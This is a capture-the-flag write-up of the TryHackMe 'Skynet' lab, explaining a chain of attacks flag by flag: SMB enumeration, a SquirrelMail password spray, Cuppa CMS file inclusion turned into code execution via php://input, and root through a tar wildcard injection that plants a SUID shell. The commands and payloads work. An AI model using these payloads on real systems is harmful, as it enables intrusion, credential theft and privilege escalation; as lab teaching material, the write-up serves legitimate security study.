---
description: "TryHackMe Skynet — a Terminator-themed boot2root. An anonymous Samba share hands you a list of password guesses; one of them logs you into SquirrelMail webmail, where an email reveals the new Samba password. That share names a hidden 'beta CMS' path running Cuppa CMS, which has a file-inclusion bug you turn into remote code execution through the php://input wrapper — no reverse shell needed. Root falls to a classic tar wildcard injection in a once-a-minute root cron job. Every command explained flag by flag, with the controls that prove each result and a teardown that removes the SUID shell afterwards."
---

# Skynet — from an anonymous file share to root, one leaked password at a time

**TryHackMe · challenge: Skynet · target: `10.x.x.x` (the lab IP changes per lease)**

> **Both flags are redacted** here as 32-hex `[redacted]`. Everything that teaches stays: every
> command with every flag explained, the controls that prove each result, the exact file-inclusion
> URL, the cron job, the payload, and the teardown. The flag strings themselves teach nothing — they
> are just proof you were there, and publishing them hands the room's answer to the next person.
>
> **What I kept and why:** the usernames, the recovered passwords, the hidden path
> `/45kra24zxs28v3yd`, the Cuppa CMS endpoint, and the full tar-wildcard payload are all *method*,
> not prize. Redacting them would gut the write-up. Only the two flag values are removed.

**The brief:** *"Are you able to compromise this Terminator-themed machine?"* Miles Dyson, the
Cyberdyne engineer who (in the films) builds the neural-net chip that becomes Skynet, is the theme.
The whole box is a chain of small leaks — each one hands you the key to the next.

---

## Vocabulary first, because the room assumes none

A **port** is a numbered door on a machine; each listening program answers behind one. Port 22 is
SSH (a remote command line), 80 is web traffic, 110/143 are email retrieval, and 139/445 are
Windows-style file sharing.

**SMB / Samba** is the file-sharing protocol behind Windows "network shares" — a folder on one
machine you can browse from another. On Linux the server is called **Samba**; the client tool we use
is `smbclient`. A **share** is one such published folder; `anonymous` access means it accepts you
with no password.

**Webmail** is email you read in a browser instead of an app. **SquirrelMail** is one such program.

A **CMS** (*Content Management System*) is software that runs a website's pages from a database —
WordPress is the famous one; **Cuppa CMS** is a small, old one.

**LFI / RFI** (*Local / Remote File Inclusion*) is a bug where a web page is tricked into loading a
file it shouldn't — a local file to *read* it, a remote or crafted one to *run code*.

**RCE** (*Remote Code Execution*) means you can run commands on the target. A **shell** is the
command line you run them through.

**Privilege escalation** ("privesc") is going from a low-power user (here the web server's
`www-data`) to the all-powerful `root`.

**A cron job** is a command Linux runs automatically on a schedule.

---

## Step 1 — Recon: what is listening?

Always start by asking the machine which doors are open. `nmap` is the port scanner everyone uses.

```bash
# Full scan of all 65535 TCP ports, then a focused version+script scan
nmap -p- -T4 --min-rate 1500 -oN nmap-allports.txt 10.x.x.x
nmap -sV -sC -T4 --top-ports 1000 -oN nmap-top1000.txt 10.x.x.x
```

- `-p-` — scan **all** 65535 ports, not just the common ones. A box that hides a service on an odd
  port is common, so never trust a default scan alone.
- `-T4` — timing template 4 ("aggressive"): faster, fine for a lab.
- `--min-rate 1500` — send at least 1500 packets/second, so the full sweep finishes in seconds.
- `-oN file` — save the output to a file (normal format). Always keep your scan output.
- `-sV` — probe each open port for the **service version** (e.g. "OpenSSH 7.2p2").
- `-sC` — run nmap's **default scripts** (safe enumeration checks).
- `--top-ports 1000` — for the slower version scan, only the 1000 most common ports.

Result — six open ports:

```
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu
80/tcp  open  http        Apache httpd 2.4.18 (Ubuntu)
110/tcp open  pop3        Dovecot pop3d
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
143/tcp open  imap        Dovecot imapd
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu
```

So: a website (80), file sharing (139/445), and email (110/143). SSH (22) needs a credential we
don't have yet. **File sharing that answers without a password is the cheapest thing to check, so
start there.**

---

## Step 2 — The anonymous Samba share

List the shares with no credentials (`-N` = no password):

```bash
smbclient -N -L //10.x.x.x
```

```
Sharename       Type      Comment
---------       ----      -------
anonymous       Disk      Skynet Anonymous Share
milesdyson      Disk      Miles Dyson Personal Share
```

`milesdyson` is the interesting one, but it needs a password. `anonymous` doesn't — so read it
first. **Read before you act:** a share is just a folder, so download everything and look before
touching anything.

```bash
# recurse ON = walk subfolders; ls = list; then mget * downloads them
smbclient -N //10.x.x.x/anonymous -c 'recurse ON; ls'
smbclient -N //10.x.x.x/anonymous -c 'prompt OFF; recurse ON; mget *'
```

Two things come out:

`attention.txt`:

```
A recent system malfunction has caused various passwords to be changed.
All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

`logs/log1.txt` — a list of 30 password guesses, all themed on "terminator":

```
cyborg007haloterminator
terminator22596
terminator219
...
```

A note saying "passwords were changed" next to a **wordlist of likely passwords** is the room
telling you: one of these is a real password. The question is *where* it works. The username is
almost certainly `milesdyson` (his name is on everything).

---

## Step 3 — Where does that password work? (a controlled test)

**Wrong turn, kept in because it teaches a habit:** my first instinct was to try the 30 passwords
against the `milesdyson` **Samba** share. All 30 failed:

```bash
smbclient //10.x.x.x/milesdyson -U 'milesdyson%cyborg007haloterminator' -c 'ls'
# session setup failed: NT_STATUS_LOGON_FAILURE
```

Before believing "none of these work", **prove the test itself is honest.** I ran a deliberately
wrong password as a control:

```bash
smbclient //10.x.x.x/milesdyson -U 'milesdyson%ZZZnope123' -c 'ls'
# session setup failed: NT_STATUS_LOGON_FAILURE  <- same message
```

Both the real candidate and the junk control fail *identically*, which means my detector works and
the list simply isn't the SMB password. (Why bother with the control? Because a broken test that
always says "fail" would look exactly like "no password matched" — a confident wrong answer. Always
run a known-good and a known-bad through any check before you trust it.)

So the list must be for a different service. The web server has webmail. Let's find it.

### Content discovery on the website

The web root (port 80) is just a static "Skynet" search page. Hidden folders need a directory
brute-force. I use `ffuf`, with controls baked in:

```bash
# Baseline: what does a page that definitely doesn't exist return?
curl -s -o /dev/null -w "%{http_code} %{size_download}\n" http://10.x.x.x/zzz_nosuchpath_4471
# -> 404 276   (missing pages are 404, 276 bytes)

# Seed a positive control (a page we KNOW exists) and a negative control into the wordlist
printf 'style.css\nzzz_nosuchpath_4471\n' > words.txt
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt >> words.txt

ffuf -u http://10.x.x.x/FUZZ -w words.txt -mc all -fc 404 -t 25 -s
```

- `-u ...FUZZ` — the word `FUZZ` is replaced by each wordlist entry in turn.
- `-w words.txt` — the wordlist.
- `-mc all` — **match all** status codes. ffuf's default hides 404s *and* some others; `-mc all`
  paired with an explicit filter is the only way to be sure nothing slips through.
- `-fc 404` — **filter out** 404 (the "missing" answer we baselined). Everything left is real.
- `-t 25` — 25 threads. Lab VMs are tiny; more threads just knock the box over (a lesson learned the
  hard way on other rooms).
- `-s` — silent: print only the matches.

Why the two controls? `style.css` must appear as a hit — if it doesn't, ffuf isn't reaching the
server and every "clean" result is a lie. The junk name must be filtered — if it shows up, my filter
is wrong. Both behaved, so the sweep is trustworthy. It found:

```
squirrelmail   admin   config   ai   css   js   server-status
```

`squirrelmail` is the webmail login.

### Spray the login (with a calibrated success signal)

SquirrelMail 1.4.23. The login form posts `login_username` and `secretkey` (the password) to
`redirect.php`. To spray it I first need to know what **failure** looks like, so I can tell success
apart from it:

```bash
# Known-wrong login: capture the response
curl -s -D - -o /dev/null http://10.x.x.x/squirrelmail/src/redirect.php \
  --data-urlencode "login_username=milesdyson" \
  --data-urlencode "secretkey=ZZZnope123wrong" \
  --data "js_autodetect_results=1&just_logged_in=1" | grep -i '^location:'
# (no Location header)
```

A **failed** login returns `200 OK` with no `Location` redirect. A **successful** one redirects you
to your mailbox — so the presence of a `Location:` header is my success signal. Now spray the 30
passwords:

```bash
while IFS= read -r pw; do
  loc=$(curl -s -D - -o /dev/null http://10.x.x.x/squirrelmail/src/redirect.php \
    --data-urlencode "login_username=milesdyson" \
    --data-urlencode "secretkey=$pw" \
    --data "js_autodetect_results=1&just_logged_in=1" | grep -i '^location:')
  [ -n "$loc" ] && { echo "[HIT] $pw -> $loc"; break; }
done < logs/log1.txt
```

```
[HIT] cyborg007haloterminator -> Location: webmail.php
```

Credential recovered: **`milesdyson : cyborg007haloterminator`** for webmail (and, it'll turn out,
the mail account behind IMAP/POP3).

---

## Step 4 — The email that leaks the real Samba password

Log in properly (keep the session cookie) and read the inbox:

```bash
# 1) log in, save the session cookie to a jar
curl -s -c jar -o /dev/null http://10.x.x.x/squirrelmail/src/redirect.php \
  --data-urlencode "login_username=milesdyson" \
  --data-urlencode "secretkey=cyborg007haloterminator" \
  --data "js_autodetect_results=1&just_logged_in=1"

# 2) read each message body using the saved cookie
curl -s -b jar "http://10.x.x.x/squirrelmail/src/read_body.php?mailbox=INBOX&passed_id=3&startMessage=1"
```

- `-c jar` saves cookies; `-b jar` sends them back. Without the session cookie the mailbox just
  bounces you to the login page.

Message 3, subject **"Samba Password reset"**:

```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```

There it is — the new Samba password for the `milesdyson` share. (Notice it contains a backtick and
an `&`; when you use it on the command line, wrap it in **single quotes** so the shell doesn't
mangle it.)

---

## Step 5 — Inside the milesdyson share: a hidden path

```bash
smbclient //10.x.x.x/milesdyson -U 'milesdyson%)s{A&2Z=F^n_E.B`' -c 'recurse ON; ls'
```

Mostly machine-learning course notes (fitting for the man who invents Skynet). One file stands out —
`notes/important.txt`:

```
1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```

`/45kra24zxs28v3yd` is a **hidden web path** — a folder on the website that isn't linked anywhere, so
no wordlist would ever find it. This is why you read every file: the app told us its own secret.

Browsing to it shows a "Miles Dyson Personal Page" placeholder. A quick controlled ffuf on that path
(same technique as before, positive control `miles.jpg`) finds one subfolder: `administrator/`. And
that is **Cuppa CMS**.

---

## Step 6 — Cuppa CMS file inclusion → code execution

Cuppa CMS has a well-known bug (Exploit-DB 25971): the file
`administrator/alerts/alertConfigField.php` takes a `urlConfig` parameter and includes whatever file
you name, with no checks. First prove it as a **read-only** file inclusion — the safest possible
probe — by reading `/etc/passwd`:

```bash
curl -sL "http://10.x.x.x/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../etc/passwd"
```

- The `../` chain climbs up out of the web folder to the filesystem root; enough of them and
  `/etc/passwd` is reached regardless of how deep the app sits ("directory traversal").

It works — `/etc/passwd` comes back, showing a local user `milesdyson`. So the include is *raw*
(`include($urlConfig)` with nothing appended). That means I can point it at a **PHP wrapper** instead
of a file, and the cleanest one is `php://input`:

```bash
curl -s "http://10.x.x.x/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://input" \
  --data '<?php echo "RCEOK:"; system("id"); ?>'
# RCEOK:uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`php://input` makes PHP treat the **body of my POST request** as the file to include — so my PHP code
runs, and its output comes straight back in the same HTTP response.

**Why this and not a reverse shell?** A reverse shell calls back to my machine, which depends on my
own firewall letting the connection in and the target being allowed to reach out — two things that
silently fail and waste hours. `php://input` needs none of that: the command output arrives in the
reply I'm already reading. **Prefer a success signal that comes through a channel you already
control.**

Now I have command execution as `www-data`. A tiny helper to run commands:

```bash
U="http://10.x.x.x/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=php://input"
curl -sL "$U" --data '<?php system("cat /home/milesdyson/user.txt"); ?>'
```

That reads **user.txt** → `[redacted]` (a 32-character hex string).

---

## Step 7 — Root via tar wildcard injection

Look for something running as root on a schedule:

```bash
curl -sL "$U" --data '<?php system("cat /etc/crontab"); ?>'
```

```
*/1 *   * * *   root   /home/milesdyson/backups/backup.sh
```

Every **minute**, as **root**, the box runs `backup.sh`. Read it:

```bash
curl -sL "$U" --data '<?php system("cat /home/milesdyson/backups/backup.sh"); ?>'
```

```bash
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

And `/var/www/html` is owned by `www-data` — the user I already am. This is the classic **tar
wildcard injection**, and it hinges on one fact about `tar`:

> When the shell expands `*`, it turns into a list of every filename in the folder. `tar` reads that
> list as its arguments — and **any filename that starts with `--` looks like a command-line option
> to tar**, not like a file. GNU tar has an option `--checkpoint-action=exec=<command>` that runs a
> command. So if I create files *named* like those options, root's `tar` will run my command.

I need three files in `/var/www/html`:

- `runme.sh` — the payload (an ordinary script).
- a file literally named `--checkpoint=1` — tells tar to trigger a "checkpoint".
- a file literally named `--checkpoint-action=exec=sh runme.sh` — tells tar to run `sh runme.sh` at
  that checkpoint.

**First, check the sort order** (a mistake I've made before): tar receives the filenames in
alphabetical order, and the two `--` files must come *before* the first real file, or tar treats them
as data to archive instead of options to obey.

```bash
curl -sL "$U" --data '<?php system("cd /var/www/html && ls"); ?>'
# 45kra24zxs28v3yd  admin  ai  config  css  image.png  index.html  js  style.css
```

The first real entry begins with `4`. A `-` (ASCII 0x2D) sorts *before* `4` (0x34), so my
`--`-prefixed files come first. Good — the attack is safe to plant.

The payload does a **reversible, mostly read-only** thing: prove we ran as root, copy the flag out,
and drop a copy of `bash` with the SUID bit so I can get an interactive root shell to verify with.

```bash
# runme.sh (planted into /var/www/html)
#!/bin/bash
id > /tmp/rootproof.txt 2>&1
cat /root/root.txt > /tmp/rootflag.txt 2>&1
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash          # 4755 = SUID: runs as its owner (root)
chmod 644 /tmp/rootproof.txt /tmp/rootflag.txt
```

Plant the three files (creating files named like options needs `touch --` so touch doesn't read them
as its own options):

```bash
cd /var/www/html
cat > runme.sh <<'INNER'
...the payload above...
INNER
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh runme.sh'
```

Then wait one minute for the cron and read the proof:

```bash
curl -sL "$U" --data '<?php system("cat /tmp/rootproof.txt; cat /tmp/rootflag.txt; ls -la /tmp/rootbash"); ?>'
```

```
uid=0(root) gid=0(root) groups=0(root)      <- root's tar ran our script
[redacted]                                   <- root.txt
-rwsr-xr-x 1 root root 1037528 /tmp/rootbash <- SUID root shell dropped
```

And the SUID shell confirms full root interactively (`-p` keeps the elevated privileges):

```bash
curl -sL "$U" --data '<?php system("/tmp/rootbash -p -c id"); ?>'
# uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

`euid=0(root)` — effective user is root. **root.txt** captured.

---

## Step 8 — Teardown (leave the box as you found it)

An exploit that *writes* to the target is a cleanup obligation. Everything I planted, removed as
root (and `rootbash` removed **last**, since I need it to remove the others):

```bash
curl -sL "$U" --data '<?php system("/tmp/rootbash -p -c \"
  rm -f /var/www/html/runme.sh
  rm -f -- /var/www/html/--checkpoint=1
  rm -f -- \x27/var/www/html/--checkpoint-action=exec=sh runme.sh\x27
  rm -f /tmp/rootproof.txt /tmp/rootflag.txt
  rm -f /tmp/rootbash
\""); ?>'
```

**A silent `rm` is not proof it worked** — verify it:

```bash
curl -sL "$U" --data '<?php system("ls -la /var/www/html | grep -E \"checkpoint|runme\" || echo CLEAN; ls /tmp/rootbash /tmp/rootproof.txt /tmp/rootflag.txt 2>&1"); ?>'
# CLEAN
# ls: cannot access '/tmp/rootbash': No such file or directory
# ls: cannot access '/tmp/rootproof.txt': No such file or directory
# ls: cannot access '/tmp/rootflag.txt': No such file or directory
```

All gone. No web shell was ever written to disk (the `php://input` wrapper runs code without leaving
a file), no reverse-shell listener was started, no SSH key or `/etc/hosts` entry was added. The cron
now backs up only the legitimate web files again.

---

## The chain, in one breath

Anonymous SMB share → password wordlist → SquirrelMail login (spray) → email leaks the real Samba
password → milesdyson share names a hidden CMS path → Cuppa CMS file inclusion → `php://input` RCE as
`www-data` → **user.txt** → root cron running `tar *` in a folder I own → tar wildcard injection →
**root.txt**.

## Room questions, answered

The TryHackMe room asks five things; here's where each was found in the chain above.

| # | Question | Answer |
|---|---|---|
| 1 | What is Miles' password for his emails? | `cyborg007haloterminator` (Step 3 — sprayed from the anonymous share's wordlist) |
| 2 | What is the hidden directory? | `/45kra24zxs28v3yd` (Step 5 — named in `notes/important.txt`) |
| 3 | What is the vulnerability called when you can include a remote file for malicious purposes? | **Remote File Inclusion (RFI)** (Step 6 — the Cuppa CMS `urlConfig` bug) |
| 4 | What is the user flag? | `[redacted]` (Step 6) |
| 5 | What is the root flag? | `[redacted]` (Step 7) |

> A note on question 3: on this build I got code execution through the **`php://input` wrapper**
> (technically a local-inclusion-to-RCE), but the underlying Cuppa CMS `urlConfig` flaw is the
> file-inclusion vulnerability the question points at, and **RFI** is the room's intended answer.

## The lessons worth keeping

- **Read every file before you act on anything.** Both pivots on this box — the password wordlist and
  the hidden CMS path — came from files just sitting in a share, not from any clever attack.
- **Control your instruments.** A known-good and a known-bad through every check (the SMB spray, the
  ffuf sweep, the login spray) is the only thing separating "no result" from "my test is broken and
  lying to me."
- **Prefer a success signal on a channel you already control.** `php://input` returned command output
  in the same response — no reverse shell, no listener, no firewall guessing.
- **Check the glob order before a tar wildcard.** One `ls` confirms the `--` files sort first;
  skipping it can quietly turn your exploit into a harmless archive.
- **Writing to the target creates a cleanup list — start it the moment you write, and verify each
  removal, because a silent `rm` looks identical to a failed one.**
